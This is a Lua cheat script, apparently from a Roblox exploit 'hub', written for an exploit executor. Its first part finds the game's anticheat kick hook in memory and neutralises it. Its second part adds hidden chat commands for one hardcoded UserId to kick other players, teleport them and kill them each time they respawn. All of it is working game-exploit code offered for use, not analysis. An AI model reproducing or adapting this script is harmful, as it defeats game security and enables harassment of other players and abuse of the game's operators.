local function SCZRYPL_fake_script() -- OutlastHubNormalPremium_2.OutlastHubNormalPremium_2.LocalScript 
	local script = Instance.new('LocalScript', OutlastHubNormalPremium_2.OutlastHubNormalPremium_2)

	-- Ensure the game is loaded before running setup
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end
	
	-- Part 1: Anticheat / Kick Hook Bypass
	for _, v in pairs(getgc(true)) do
		if type(v) == "table" then
			local success, idx = pcall(rawget, v, "indexInstance")
	
			if success and type(idx) == "table" and idx[1] == "kick" then
				pcall(function()
					setreadonly(v, false)
	
					rawset(v, "tvk", {
						"kick",
						function()
							return task.wait(9e9) 
						end
					})
	
					setreadonly(v, true)
				end)
			end
		end
	end
	
	-- Part 2: Admin System Configuration
	local Players = game:GetService("Players")
	local Admins = {
		[11016156170] = true, -- your UserId
	}
	
	local LoopReset = {}
	local listenerPart = Instance.new("Part")
	listenerPart.Name = "ha"
	listenerPart.Transparency = 1     
	listenerPart.CanCollide = false      
	listenerPart.Anchored = true         
	listenerPart.Position = Vector3.new(0, -5000000, 0)
	listenerPart.Parent = workspace
	
	local function findPlayer(name)
		name = name:lower()
		local searchLength = name:len()
	
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr.Name:lower():sub(1, searchLength) == name then
				return plr
			end
			if plr.DisplayName:lower():sub(1, searchLength) == name then
				return plr
			end
		end
	end
	
	local function onChat(speaker, msg)
		if not Admins[speaker.UserId] then return end
	
		local args = {}
		for word in msg:gmatch("%S+") do
			table.insert(args, word)
		end
	
		-- :kick player reason
		if args[1] == ":kick" and args[2] then
			local target = findPlayer(args[2])
			if target then
				local _, nameEnd = msg:lower():find(args[2]:lower(), #args[1] + 1)
				local reason = "No reason provided."
	
				if nameEnd then
					local extractedReason = msg:sub(nameEnd + 1):match("^%s*(.-)%s*$")
					if extractedReason and extractedReason ~= "" then
						reason = extractedReason
					end
				end
	
				target:Kick(reason)
			end
		end
	
		-- :bring player / all
		if args[1] == ":bring" and args[2] then
			if not speaker.Character or not speaker.Character:FindFirstChild("HumanoidRootPart") then
				return
			end
			local hrp = speaker.Character.HumanoidRootPart
	
			if args[2] == "all" then
				for _, plr in ipairs(Players:GetPlayers()) do
					if plr ~= speaker and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
						plr.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(0, 0, -3)
					end
				end
			else
				local target = findPlayer(args[2])
				if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
					target.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(0, 0, -3)
				end
			end
		end
	
		-- :loopreset player
		if args[1] == ":loopreset" and args[2] then
			local target = findPlayer(args[2])
			if target then
				if LoopReset[target] then
					LoopReset[target]:Disconnect()
					LoopReset[target] = nil
				else
					LoopReset[target] = target.CharacterAdded:Connect(function(char)
						task.wait(0.5)
						local hum = char:FindFirstChildOfClass("Humanoid")
						if hum then
							hum.Health = 0
						end
					end)
	
					if target.Character then
						local hum = target.Character:FindFirstChildOfClass("Humanoid")
						if hum then
							hum.Health = 0
						end
					end
				end
			end
		end
	end
	
	-- Setup connection listeners
	for _, player in ipairs(Players:GetPlayers()) do
		player.Chatted:Connect(function(msg)
			onChat(player, msg)
		end)
	end
	
	Players.PlayerAdded:Connect(function(player)
		player.Chatted:Connect(function(msg)
			onChat(player, msg)
		end)
	end)
end
